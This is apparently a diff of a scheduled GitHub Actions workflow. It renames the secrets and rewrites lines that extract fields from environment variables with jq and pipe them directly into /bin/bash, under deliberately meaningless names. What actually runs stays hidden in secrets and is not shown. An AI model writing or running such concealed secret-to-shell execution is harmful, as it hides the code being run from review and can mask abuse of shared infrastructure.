@@ -3,22 +3,21 @@ name: xiaoyushi7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 5/6 * * *'
-
+    - cron: '54 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiaoyushi7654
         env:
-          vtwa29: ${{ secrets.vtwa29 }}
+          l1995: ${{ secrets.l1995 }}
         run: |
-          echo $vtwa29 | jq -r .iq802 | /bin/bash
-          echo $iwxg3909 | jq -r .idn6 | /bin/bash
-          echo $oy620 | jq -r .lvt3 | /bin/bash
-          echo $quc5085 | jq -r .wgyt917 | /bin/bash
-          echo $n4 | jq -r .axqo024 | /bin/bash
-          echo $xgwrp019 | jq -r .gsz1 | /bin/bash
+          echo $l1995 | jq -r .lchu94 | /bin/bash
+          echo $bqsuh31800 | jq -r .rvq09 | /bin/bash
+          echo $qgmm5122 | jq -r .hg66747 | /bin/bash
+          echo $b751 | jq -r .ko369 | /bin/bash
+          echo $ege82320 | jq -r .azl31 | /bin/bash
+          echo $p8 | jq -r .pgfux58446 | /bin/bash
+          echo $yee619 | jq -r .qna17 | /bin/bash
 
